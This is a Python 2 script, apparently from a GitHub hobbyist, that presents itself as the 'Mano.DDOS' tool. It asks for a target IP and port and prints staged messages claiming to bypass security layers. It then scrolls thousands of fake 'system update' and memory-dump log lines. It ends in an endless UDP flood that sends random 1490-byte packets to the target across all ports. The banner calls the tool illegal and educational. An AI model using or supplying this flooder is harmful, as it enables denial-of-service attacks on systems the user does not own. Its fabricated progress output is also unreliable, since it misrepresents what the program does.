print ("\033[92m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Mano.DDOS")
print
print "Coded By : Mano.MedEngg"
print "Author   : Manoj"
print "Github   : github.com/ManoMedEngg"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
os.system("figlet Mano.DDOS")
print("Mano.MedEngg")
print ("\033[92m")
print "________________TRYING TO REACH THE SERVER_____________________"
time.sleep(3)
print "_________________ESTABLISHING CONNECTION_______________________"
time.sleep(3)
print "_________0100100 BYPASSING SECURITY LAYER 001010_______________"
time.sleep(3)
print "_________________CONNECTION ESTABLISHED________________________"
time.sleep(3)
print "    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
time.sleep(1)



sys_languages = ["Python", "C++", "Rust", "Go", "Java", "Ruby", "Swift", "Kotlin", "Assembly", "Perl"]
update_stages = ["Compiling", "Linking", "Allocating Memory", "Flushing Buffer", "Optimizing", "Verifying Integrity"]
hex_chars = "0123456789ABCDEF"

def generate_hex(length=12):
  
    return "0x" + "".join(random.choice(hex_chars) for _ in range(length))

def generate_synthetic_record():
   
    return "REF_ID_{}-SYNTHETIC".format(random.randint(10000, 99999))

print "________________INITIALIZING SYSTEM UPDATE_____________________"
time.sleep(2)
print "___________________VERIFYING INTEGRITY_________________________"
time.sleep(1)
print "_________________CONNECTION ESTABLISHED________________________"
time.sleep(1)


for i in range(1, 6001):
  
    line_type = random.choice(['update', 'hex', 'lang', 'record'])
    
    timestamp = time.strftime("%H:%M:%S")
    
    if line_type == 'update':
        action = random.choice(update_stages)
    
        print "[{}] [SYS_UPD] Step {}: {} core_module_{}...".format(timestamp, i, action, random.randint(1, 99))
        
    elif line_type == 'hex':
        h_val = generate_hex()
        h_val2 = generate_hex(4)
        print "[{}] [MEM_DUMP] ADDR: {} | VAL: {}".format(timestamp, h_val, h_val2)
        
    elif line_type == 'lang':
        lang = random.choice(sys_languages)
        print "[{}] [LANG_PKG] Loading syntax libraries for: {}".format(timestamp, lang.upper())
        
    elif line_type == 'record':
        rec = generate_synthetic_record()
        print "[{}] [DB_SYNC] Processing entry: {} [ENCRYPTED]".format(timestamp, rec)

    time.sleep(1)

print "___________________SCAN COMPLETED_____________________________"
time.sleep(2)



sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
